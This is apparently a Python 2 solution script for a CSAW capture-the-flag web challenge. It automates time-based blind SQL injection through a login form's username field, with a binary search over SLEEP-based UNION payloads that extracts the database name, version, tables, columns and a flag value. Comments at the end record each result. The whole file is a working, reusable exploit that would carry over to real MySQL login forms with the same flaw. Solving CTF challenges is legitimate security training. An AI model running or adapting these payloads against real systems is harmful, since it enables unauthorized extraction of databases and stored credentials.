import requests
import time

URL = 'http://web.chal.csaw.io:10101/auth/login'
SLEEP = .5
MAX = 255
MIN = 0

def findSchemaLength():
	counter = 1
	while True:
		start = time.time()
		payload = {
			'username': "any' UNION SELECT IF(LENGTH(DATABASE())=" + str(counter) + ",SLEEP(" + str(SLEEP) + "),0) ; -- ",
			'password': "any",
		}
		r = requests.post(URL, data=payload)
		end = time.time()
		if end-start>SLEEP:
			break
		counter+=1  
	print "Database length = %d " %counter
	
def findSchemaName(schemaLength):
	name = ""
	while len(name) != schemaLength:
		tempMax = MAX
		tempMin = MIN
		while True:
			start = time.time()
			payload = {
				'username': "any' UNION SELECT IF(ASCII(SUBSTR(DATABASE()," + str(len(name)+1) + ",1))<=" + str(int((tempMax+tempMin)/2)) + ",SLEEP(" + str(SLEEP) + "),0) ; -- ",
				'password': "any",
			}
			r = requests.post(URL, data=payload)
			end = time.time()
			if end-start>SLEEP:
				tempMax = int((tempMax+tempMin)/2)
			else:
				tempMin = int((tempMax+tempMin)/2)+1
			if tempMax <= tempMin:
				name += chr(tempMax)
				break
	print "Database name = %s " %name
	
def findDatabaseVersionLength():
	counter = 1
	while True:
		start = time.time()
		payload = {
			'username': "any' UNION SELECT IF(LENGTH(version())=" + str(counter) + ",SLEEP(" + str(SLEEP) + "),0) ; -- ",
			'password': "any",
		}
		r = requests.post(URL, data=payload)
		end = time.time()
		if end-start>SLEEP:
			break
		counter+=1  
	print "Database version length = %d " %counter
	
def findDatabaseVersionName(versionLength):
	name = ""
	while len(name) != versionLength:
		tempMax = MAX
		tempMin = MIN
		while True:
			start = time.time()
			payload = {
				'username': "any' UNION SELECT IF(ASCII(SUBSTR(Version()," + str(len(name)+1) + ",1))<=" + str(int((tempMax+tempMin)/2)) +",SLEEP(" + str(SLEEP) + "),0) ; -- ",
				'password': "any",
			}
			r = requests.post(URL, data=payload)
			end = time.time()
			if end-start>SLEEP:
				tempMax = int((tempMax+tempMin)/2)
			else:
				tempMin = int((tempMax+tempMin)/2)+1
			if tempMax <= tempMin:
				name += chr(tempMax)
				break
	print "Database version name = %s " %name
	
def countTables(schemaName):
	counter = 1
	while True:
		start = time.time()
		payload = {
			'username': "any' UNION SELECT IF((select count(table_name) from information_schema.tables where table_schema = '"+schemaName+"' )=" + str(counter) + ",SLEEP(" + str(SLEEP) + "),0) ; -- ",
			'password': "any",
		}
		r = requests.post(URL, data=payload)
		end = time.time()
		if end-start>SLEEP:
			break
		counter+=1  
	print "Number of tables = %d " %counter
	
def findTableLengths(numOfTables,schemaName):
	tableNumber = 0
	while tableNumber < numOfTables:
		counter = 1
		while True:
			start = time.time()
			payload = {
				'username': "any' UNION SELECT IF(LENGTH((SELECT table_name from information_schema.tables where table_schema = '" + schemaName + "' limit " + str(tableNumber) + ",1))=" + str(counter) + ",SLEEP(" +str(SLEEP) + "),0) ; -- ",
				'password': "any",
			}
			r = requests.post(URL, data=payload)
			end = time.time()
			if end-start>SLEEP:
				break
			counter+=1  
		print "Table %d has length = %d" %(tableNumber,counter)
		tableNumber+=1
	print "done"
	
def findTableNames(schemaName,lengthList):
	tableNumber = 0
	while tableNumber < len(lengthList):
		name = ""
		while len(name) < lengthList[tableNumber]:
			tempMax = MAX
			tempMin = MIN
			while True:
				start = time.time()
				payload = {
					'username': "any' UNION SELECT IF(ASCII(SUBSTR((SELECT table_name from information_schema.tables where table_schema = '" + schemaName + "' limit " + str(tableNumber) + ",1)," + str(len(name)+1) + ",1))<=" + str(int((tempMax+tempMin)/2)) +",SLEEP(" + str(SLEEP) + "),0) ; -- ",
					'password': "any",
				}
				r = requests.post(URL, data=payload)
				end = time.time()
				if end-start>SLEEP:
					tempMax = int((tempMax+tempMin)/2)
				else:
					tempMin = int((tempMax+tempMin)/2)+1
				if tempMax <= tempMin:
					name += chr(tempMax)
					break
		print "Table %d is named = %s" %(tableNumber,name)
		tableNumber+=1
	print "done"
	
def countColumns(schemaName,tableName):
	counter = 0
	while True:
		start = time.time()
		payload = {
			'username': "any' UNION SELECT IF((select count(COLUMN_name) from information_schema.columns where table_schema = '"+schemaName+"' AND table_name = '" + tableName + "')=" + str(counter) + ",SLEEP(" + str(SLEEP) + "),0) ; -- ",
			'password': "any",
		}
		r = requests.post(URL, data=payload)
		end = time.time()
		if end-start>SLEEP:
			break
		counter+=1  
	print "Number of columns in %s = %d " %(tableName,counter)
	
def countRows(tableName):
	counter = 0
	while True:
		start = time.time()
		payload = {
			'username': "any' UNION SELECT IF((select count(*) from " + tableName + ")=" + str(counter) + ",SLEEP(" +str(SLEEP) + "),0) ; -- ",
			'password': "any",
		}
		r = requests.post(URL, data=payload)
		end = time.time()
		if end-start>SLEEP:
			break
		counter+=1  
	print "Number of rows in %s = %d " %(tableName,counter)
	
def findColumnsLength(numOfColumns,schemaName,tableName):
	columnNumber = 0
	while columnNumber < numOfColumns:
		counter = 1
		while True:
			start = time.time()
			payload = {
				'username': "any' UNION SELECT IF(LENGTH((SELECT COLUMN_name from information_schema.columns where table_schema = '"+schemaName+"' AND table_name = '" + tableName + "' limit " + str(columnNumber) + ",1))=" + str(counter) + ",SLEEP(" + str(SLEEP) + "),0) ; -- ",
				'password': "any",
			}
			r = requests.post(URL, data=payload)
			end = time.time()
			if end-start>SLEEP:
				break
			counter+=1  
		print "Column %d has length = %d" %(columnNumber,counter)
		columnNumber+=1
	print "done"

def findColumnNames(schemaName,tableName,lengthList):
	columnNumber = 0
	while columnNumber < len(lengthList):
		name = ""
		while len(name) < lengthList[columnNumber]:
			tempMax = MAX
			tempMin = MIN
			while True:
				start = time.time()
				payload = {
					'username': "any' UNION SELECT IF(ASCII(SUBSTR((SELECT COLUMN_name from information_schema.columns where table_schema = '" + schemaName + "' AND table_name = '" + tableName + "' limit " + str(columnNumber) + ",1)," + str(len(name)+1) + ",1))<=" + str(int((tempMax+tempMin)/2)) + ",SLEEP(" + str(SLEEP) + "),0) ; -- ",
					'password': "any",
				}
				r = requests.post(URL, data=payload)
				end = time.time()
				if end-start>SLEEP:
					tempMax = int((tempMax+tempMin)/2)
				else:
					tempMin = int((tempMax+tempMin)/2)+1
				if tempMax <= tempMin:
					name += chr(tempMax)
					break
		print "Column %d is named = %s" %(columnNumber,name)
		columnNumber+=1
	print "done"
	
def getValueLength(tableName,columnName,numOfRows):
	rowNumber = 0
	while rowNumber < numOfRows:
		counter = 1
		while True:
			start = time.time()
			payload = {
				'username': "any' UNION SELECT IF(LENGTH((SELECT " + columnName + " from " + tableName + " limit " + str(rowNumber) + ",1))=" + str(counter) + ",SLEEP(" + str(SLEEP) + "),0) ; -- ",
				'password': "any",
			}
			r = requests.post(URL, data=payload)
			end = time.time()
			if end-start>SLEEP:
				break
			counter+=1  
		print "Row %d has length = %d" %(rowNumber,counter)
		rowNumber+=1
	print "done"
	
def findValueNames(tableName,columnName,lengthList):
	rowNumber = 0
	while rowNumber < len(lengthList):
		name = ""
		while len(name) < lengthList[rowNumber]:
			tempMax = MAX
			tempMin = MIN
			while True:
				start = time.time()
				payload = {
					'username': "any' UNION SELECT IF(ASCII(SUBSTR((SELECT " + columnName + " from " + tableName + " limit " + str(rowNumber) + ",1)," + str(len(name)+1) + ",1))<=" + str(int((tempMax+tempMin)/2)) +",SLEEP("+str(SLEEP)+"),0) ; -- ",
					'password': "any",
				}
				r = requests.post(URL, data=payload)
				end = time.time()
				if end-start>SLEEP:
					tempMax = int((tempMax+tempMin)/2)
				else:
					tempMin = int((tempMax+tempMin)/2)+1
				if tempMax <= tempMin:
					name += chr(tempMax)
					break
		print "Row %d is named = %s" %(rowNumber,name)
		rowNumber+=1
	print "done"
	
# length = 9
# findSchemaLength()

# look_here
# findSchemaName(9)

# version length = 6
# findDatabaseVersionLength()

# 8.0.12
# findDatabaseVersionName(6)

# 2
# countTables("look_here")

# Table 0 has length = 12
# Table 1 has length = 5
# findTableLengths(2,"look_here")

# Table 0 is named = look_in_here
# Table 1 is named = users
# findTableNames("look_here",[12,5])

# Number of columns in look_in_here = 1
# countColumns("look_here","look_in_here")

# Number of rows in look_in_here = 1
# countRows("look_in_here")

# Column 0 has length = 4
# findColumnsLength(1,"look_here","look_in_here")

# Column 0 is named = flag
# findColumnNames("look_here","look_in_here",[4])

# Row 0 has length = 32
# getValueLength("look_in_here","flag",1)

# flag{nOW_W45N7_7h47_547I5fyiN9?}
# findValueNames("look_in_here","flag",[32])